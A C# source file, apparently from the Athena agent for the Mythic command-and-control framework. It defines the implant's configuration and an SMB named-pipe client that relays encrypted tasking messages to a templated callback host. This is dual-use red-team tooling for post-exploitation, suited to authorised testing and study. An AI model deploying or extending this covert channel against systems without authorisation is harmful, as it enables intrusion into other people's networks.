﻿using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public SmbClient currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SmbServer smbConfig { get; set; }

        public MythicConfig()
        {
            this.uuid = "35ce7904-ca99-4528-bfb8-22965945713a";
            this.killDate = DateTime.Parse("2022-08-25");
            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new SmbClient(this.uuid, this);
            this.smbConfig = new SmbServer();
        }
    }

    public class SmbClient
    {
        public string psk { get; set; }
        public string callbackHost { get; set; }
        public string pipeName { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public NamedPipeClientStream pipeStream { get; set; }
        public PSKCrypto crypt { get; set; }
        //public string uuid { get; set; }
        private string recv { get; set; }
        private string send { get; set; }
        private MythicConfig baseConfig { get; set; }
        public bool encrypted { get; set; }

        public SmbClient(string uuid, MythicConfig config)
        {
            this.callbackHost = "%SERVER%";
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.pipeName = "pipe_name";
            this.baseConfig = config;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

            Task.Run(() => Connect(this.callbackHost, this.pipeName));
        }

        public bool Connect(string host, string pipename)
        {
            try
            {
                this.pipeStream = new NamedPipeClientStream
                    (this.callbackHost, this.pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);

                //Should I add a timeout for this?
                this.pipeStream.Connect();
                try
                {
                    // Read user input and send that to the client process.
                    using (BinaryWriter _bw = new BinaryWriter(pipeStream))
                    using (BinaryReader _br = new BinaryReader(pipeStream))
                    {
                        while (true)
                        {
                            //Wait for a message to be ready to send.
                            while (string.IsNullOrEmpty(this.send)) ;
                            DelegateMessage msg = new DelegateMessage()
                            {
                                uuid = this.baseConfig.uuid,
                                message = this.send,
                                c2_profile = "smbclient"
                            };
                            this.send = "";

                            var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
                            _bw.Write((uint)buf.Length);
                            _bw.Write(buf);

                            //Wait for response
                            var len = _br.ReadUInt32();
                            var temp = new string(_br.ReadChars((int)len));
                            this.recv = temp;
                        }
                    }
                }
                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
                catch (IOException e)
                {
                    //It may be worth adding some "link" functioanlity
                }
                catch
                {
                    //Generic catches
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                this.recv = "";
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                this.send = json;

                while (string.IsNullOrEmpty(this.recv)) ;

                if (this.encrypted)
                {
                    string retString = this.recv;
                    return this.crypt.Decrypt(retString);
                }
                else
                {
                    string retString = this.recv;
                    return Misc.Base64Decode(retString).Substring(36);
                }
            }
            catch
            {
                return "";
            }
        }
    }
}
